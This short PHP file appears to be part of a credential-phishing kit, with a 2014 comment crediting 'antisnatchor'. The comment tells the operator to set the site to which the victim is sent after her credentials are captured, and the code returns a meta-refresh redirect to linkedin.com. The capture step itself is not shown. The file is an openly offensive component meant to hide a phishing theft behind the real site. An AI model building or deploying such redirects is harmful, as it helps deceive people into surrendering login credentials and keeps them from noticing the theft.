<!-- created by antisnatchor, 10th September 2014
  NOTE: make sure you change '$redirect_to' value to the site you want the victim to be
        redirected to after she submits her credentials (which will be captured)
-->
<?php
  
   $redirect_to = "http://linkedin.com/";
   
  // after credentials are captured, redirect to '$redirect_to'
  echo "<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"refresh\" content=\"0;URL='" . $redirect_to . "'\" /></head></html>";
?>